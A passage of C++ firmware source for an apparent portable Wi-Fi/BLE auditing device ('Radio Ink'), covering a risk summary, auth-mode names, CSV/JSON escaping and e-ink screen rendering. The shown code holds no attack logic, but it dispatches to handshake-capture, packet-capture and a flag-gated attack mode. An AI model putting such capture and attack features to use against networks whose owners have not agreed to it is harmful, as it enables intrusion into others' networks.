    const std::string label = w.ssid.empty() ? std::string("<hidden>") : w.ssid;
    if (!cameraFingerprintReason(label, macVendor(w.bssid)).empty()) cameraHits++;
  }

  for (const auto& b : bleFindings) {
    if (b.rssi >= -55) closeBle++;
    const std::string label = b.name.empty() ? b.address : b.name + " " + b.address;
    const std::string advType = decodeBleAdvert(b.manufacturerHex, b.serviceDataUuid, b.serviceDataHex);
    if (!cameraFingerprintReason(label + " " + advType, bleCompany(b.manufacturerHex)).empty()) cameraHits++;
  }
  for (const auto& p : probeFindings) {
    if (!p.ssid.empty()) directedProbes++;
  }

  if (wifiFindings.empty() && bleFindings.empty() && probeFindings.empty()) {
    return "Risk: no scan data yet\n";
  }

  String out = "Risk: ";
  out += openOrWep;
  out += " open/WEP, ";
  out += weakWifi;
  out += " weak WPA, ";
  out += hiddenWifi;
  out += " hidden, ";
  out += closeBle;
  out += " close BLE, ";
  out += directedProbes;
  out += " directed probes, ";
  out += cameraHits;
  out += " camera hits\n";
  return out;
}

String RadioAuditActivity::scanModeName() const { return deepScanMode ? "deep" : "quick"; }

std::string RadioAuditActivity::authName(wifi_auth_mode_t auth) {
  switch (auth) {
    case WIFI_AUTH_OPEN:
      return "OPEN";
    case WIFI_AUTH_WEP:
      return "WEP";
    case WIFI_AUTH_WPA_PSK:
      return "WPA";
    case WIFI_AUTH_WPA2_PSK:
      return "WPA2";
    case WIFI_AUTH_WPA_WPA2_PSK:
      return "WPA/WPA2";
    case WIFI_AUTH_WPA2_ENTERPRISE:
      return "WPA2-EAP";
    case WIFI_AUTH_WPA3_PSK:
      return "WPA3";
    case WIFI_AUTH_WPA2_WPA3_PSK:
      return "WPA2/WPA3";
    case WIFI_AUTH_WAPI_PSK:
      return "WAPI";
    case WIFI_AUTH_OWE:
      return "OWE";
    case WIFI_AUTH_WPA3_ENT_192:
      return "WPA3-EAP-192";
    case WIFI_AUTH_WPA3_ENTERPRISE:
      return "WPA3-EAP";
    case WIFI_AUTH_WPA2_WPA3_ENTERPRISE:
      return "WPA2/WPA3-EAP";
    case WIFI_AUTH_WPA_ENTERPRISE:
      return "WPA-EAP";
    default:
      return "UNKNOWN";
  }
}

String RadioAuditActivity::csvEscape(const std::string& value) {
  String out = "\"";
  for (char c : value) {
    if (c == '"') out += '"';
    out += c;
  }
  out += "\"";
  return out;
}

int RadioAuditActivity::averageRssi(int rssiSum, int seenCount) {
  if (seenCount <= 0) return 0;
  return rssiSum / seenCount;
}

String RadioAuditActivity::jsonEscape(const std::string& value) {
  String out = "\"";
  for (char c : value) {
    switch (c) {
      case '"':
        out += "\\\"";
        break;
      case '\\':
        out += "\\\\";
        break;
      case '\n':
        out += "\\n";
        break;
      case '\r':
        out += "\\r";
        break;
      case '\t':
        out += "\\t";
        break;
      default:
        if (static_cast<uint8_t>(c) < 0x20) {
          out += " ";
        } else {
          out += c;
        }
        break;
    }
  }
  out += "\"";
  return out;
}

void RadioAuditActivity::render(RenderLock&&) {
  const auto& metrics = UITheme::getInstance().getMetrics();
  const auto pageWidth = renderer.getScreenWidth();
  const auto pageHeight = renderer.getScreenHeight();
  renderer.clearScreen();

  const int contentTop = metrics.topPadding + metrics.headerHeight + metrics.verticalSpacing;
  const int summaryX = metrics.contentSidePadding;

  if (locating) {
    renderLocator();
    return;
  }

  if (state == State::CAPTURING) {
    if (captureMode == CaptureMode::Pcap)
      renderCapture();
    else if (captureMode == CaptureMode::DeauthDetect)
      renderDeauthDetect();
    else if (captureMode == CaptureMode::DroneScan)
      renderDroneScan();
    else
      renderHandshake();
    return;
  }

  if (state == State::STALKING) {
    renderAntiStalk();
    return;
  }

  if (state == State::GUARDIAN) {
    renderGuardian();
    return;
  }

  if (state == State::LOG_SETUP) {
    renderLogSetup();
    return;
  }

  if (state == State::LOGGING) {
    renderScheduledLog();
    return;
  }

#if defined(RADIO_AUDIT_ENABLE_ACTIVE)
  if (state == State::ATTACKING) {
    renderAttack();
    return;
  }
#endif

  if (showingMdnsList) {
    renderMdnsList();
    return;
  }

  if (showingCameraList) {
    renderCameraList();
    return;
  }

  if (showingTarget) {
    if (targetMenuOpen) {
      renderTargetMenu();
      return;
    }
    const int itemCount = static_cast<int>(targetLines.size());
    GUI.drawHeader(renderer, Rect{0, metrics.topPadding, pageWidth, metrics.headerHeight}, targetTitle.c_str(),
                   status.c_str());

    if (itemCount == 0) {
      const auto height = renderer.getLineHeight(UI_10_FONT_ID);
      const auto top = contentTop + (pageHeight - contentTop - metrics.buttonHintsHeight - height) / 2;
      UITheme::drawCenteredText(renderer, Rect{0, contentTop, pageWidth, pageHeight - contentTop}, UI_10_FONT_ID, top,
                                "No data");
    } else {
      const int listHeight = pageHeight - contentTop - metrics.buttonHintsHeight - metrics.verticalSpacing;
      GUI.drawList(
          renderer, Rect{0, contentTop, pageWidth, listHeight}, itemCount, targetScroll,
          [this](int index) { return targetLines[index]; }, nullptr, nullptr,
          [this](int index) { return std::to_string(index + 1) + "/" + std::to_string(targetLines.size()); });
    }

    // Deep-scan detail (WiFi or BLE) opens an action menu; other views just close.
    const char* confirmLabel = targetLocatable ? "Actions" : "Back";
    const auto labels = mappedInput.mapLabels("Back", confirmLabel, "Up", "Down");
    UITheme::getInstance().suppressBrandLogoOnce();  // log view: no brand logo
    GUI.drawButtonHints(renderer, labels.btn1, labels.btn2, labels.btn3, labels.btn4);
    renderer.displayBuffer();
    return;
  }

  if (showingDetails || showingFindings) {
    const bool bleMode = showingBleDetails;
    const int itemCount =
        showingFindings ? static_cast<int>(auditFindings.size())
                        : (bleMode ? static_cast<int>(bleFindings.size()) : static_cast<int>(wifiFindings.size()));
    GUI.drawHeader(renderer, Rect{0, metrics.topPadding, pageWidth, metrics.headerHeight},
                   showingFindings ? "Audit Findings" : (bleMode ? "BLE Results" : "WiFi Results"), status.c_str());

    if (itemCount == 0) {
      const auto height = renderer.getLineHeight(UI_10_FONT_ID);
      const auto top = contentTop + (pageHeight - contentTop - metrics.buttonHintsHeight - height) / 2;
      UITheme::drawCenteredText(renderer, Rect{0, contentTop, pageWidth, pageHeight - contentTop}, UI_10_FONT_ID, top,
                                "No results");
    } else {
      const int listHeight = pageHeight - contentTop - metrics.buttonHintsHeight - metrics.verticalSpacing;
      GUI.drawList(
          renderer, Rect{0, contentTop, pageWidth, listHeight}, itemCount, selectedFinding,
          [this, bleMode](int index) {
            if (showingFindings) {
              const auto& f = auditFindings[index];
              return f.severity + "  " + f.title;
            }
            if (bleMode) {
              const auto& b = bleFindings[index];
              if (!b.name.empty()) return b.name;
              return b.address;
            }
            const auto& w = wifiFindings[index];
            const std::string name = w.ssid.empty() ? std::string("<hidden>") : w.ssid;
            return (w.marked ? std::string("[*] ") : std::string()) + name;
          },
          [this, bleMode](int index) {
            if (showingFindings) {
              return auditFindings[index].detail;
            }
            if (bleMode) {
              const auto& b = bleFindings[index];
              const std::string advType = decodeBleAdvert(b.manufacturerHex, b.serviceDataUuid, b.serviceDataHex);
              std::string out = advType.empty() ? b.address : (advType + "  " + std::to_string(b.rssi) + " dBm");
              if (advType.empty()) out += "  " + std::to_string(b.rssi) + " dBm";
              if (b.seenCount > 1 || deepScanMode) {
                out += "  seen " + std::to_string(b.seenCount) + "/" + std::to_string(scanTotalPasses);
              }
              if (b.hasTxPower) out += " TX " + std::to_string(b.txPower);
              return out;
            }
            const auto& w = wifiFindings[index];
            std::string out =
                w.bssid + "  " + std::to_string(w.rssi) + " dBm  CH" + std::to_string(w.channel) + "  " + w.auth;
            if (w.seenCount > 1 || deepScanMode) {
              out += "  seen " + std::to_string(w.seenCount) + "/" + std::to_string(scanTotalPasses);
            }
            return out;
          },
          nullptr,
          [this, bleMode](int index) {
            if (showingFindings) return std::to_string(index + 1) + "/" + std::to_string(auditFindings.size());
            if (bleMode) return std::to_string(index + 1) + "/" + std::to_string(bleFindings.size());
            return std::to_string(index + 1) + "/" + std::to_string(wifiFindings.size());
          });
    }

    const bool findingHasTarget =
        showingFindings && selectedFinding < static_cast<int>(auditFindings.size()) &&
        (auditFindings[selectedFinding].wifiIndex >= 0 || auditFindings[selectedFinding].bleIndex >= 0);
    const char* selectLabel = showingFindings ? (findingHasTarget ? "Deep Scan" : "Close") : "Deep Scan";
    const auto labels = mappedInput.mapLabels("Back", selectLabel, "Up", "Down");
    UITheme::getInstance().suppressBrandLogoOnce();  // log view: no brand logo
    GUI.drawButtonHints(renderer, labels.btn1, labels.btn2, labels.btn3, labels.btn4);
    renderer.displayBuffer();
    return;
  }

  const String headerTitle = currentCategory < 0
                                 ? String("Radio Ink")
                                 : String("Radio Ink  \xC2\xBB  ") + ACTION_CATEGORIES[currentCategory].name;
  GUI.drawHeader(renderer, Rect{0, metrics.topPadding, pageWidth, metrics.headerHeight}, headerTitle.c_str(),
                 status.c_str());

  int y = contentTop;
  // Sub-header counts strip.
  renderer.drawText(
      UI_12_FONT_ID, summaryX, y,
      (String("APs ") + wifiFindings.size() + "   BLE " + bleFindings.size() + "   Probes " + probeFindings.size())
          .c_str(),
      true, EpdFontFamily::BOLD);
  y += renderer.getLineHeight(UI_12_FONT_ID) + 8;
  renderer.drawText(SMALL_FONT_ID, summaryX, y,
                    (String("Mode: ") + (deepScanMode ? "Deep" : "Quick") + "  Passes: " + scanTotalPasses).c_str());
  y += renderer.getLineHeight(SMALL_FONT_ID) + 6;
  if (!scanTime.empty()) {
    renderer.drawText(SMALL_FONT_ID, summaryX, y, (String("Last scan: ") + scanTime.c_str()).c_str());
    y += renderer.getLineHeight(SMALL_FONT_ID) + 6;
  }
  const String risk = makeRiskSummary();
  renderer.drawText(SMALL_FONT_ID, summaryX, y,
                    renderer.truncatedText(SMALL_FONT_ID, risk.c_str(), pageWidth - summaryX * 2).c_str());
  y += renderer.getLineHeight(SMALL_FONT_ID) + 6;

  if (!wifiFindings.empty()) {
    const auto& w = wifiFindings[0];
    const String strongest = String("Strongest: ") + (w.ssid.empty() ? "<hidden>" : w.ssid.c_str());
    renderer.drawText(SMALL_FONT_ID, summaryX, y,
                      renderer.truncatedText(SMALL_FONT_ID, strongest.c_str(), pageWidth - summaryX * 2).c_str());
    y += renderer.getLineHeight(SMALL_FONT_ID) + 4;
    const String details = String("avg ") + w.rssi + " dBm, CH" + w.channel + ", " + w.auth.c_str() + ", seen " +
                           w.seenCount + "/" + scanTotalPasses;
    renderer.drawText(SMALL_FONT_ID, summaryX, y, details.c_str());
  }

  constexpr int visibleActionRows = 4;
  const int listHeight = metrics.menuRowHeight * visibleActionRows;
  const int listTop = pageHeight - metrics.buttonHintsHeight - metrics.verticalSpacing - listHeight;
  // List reserves a gutter on the right for the skull mark.
  const int listWidth = pageWidth - RADIOINK_SKULL_WIDTH - summaryX;
  const Rect listRect{0, listTop, listWidth, listHeight};
  if (currentCategory < 0) {
    // Top-level category list.
    GUI.drawList(
        renderer, listRect, CATEGORY_COUNT, selectedCategory,
        [](int index) { return std::string(ACTION_CATEGORIES[index].name); }, nullptr,
        [](int index) { return ACTION_CATEGORIES[index].icon; });
  } else {
    // Items within the selected category.
    const ActionCategory& cat = ACTION_CATEGORIES[currentCategory];
    GUI.drawList(
        renderer, listRect, cat.count, selectedItem,
        [&cat](int index) { return std::string(actionLabel(cat.items[index])); }, nullptr,
        [&cat](int index) { return actionIcon(cat.items[index]); });
  }

  // The list reserves a right gutter (listWidth) for the skull mark, which the
  // Radio Ink theme stamps in drawButtonHints — no logo suppression here.
  const char* backLabel = currentCategory < 0 ? "Home" : "Back";
  const auto labels = mappedInput.mapLabels(backLabel, "Select", "Up", "Down");
  GUI.drawButtonHints(renderer, labels.btn1, labels.btn2, labels.btn3, labels.btn4);
  renderer.displayBuffer();
}
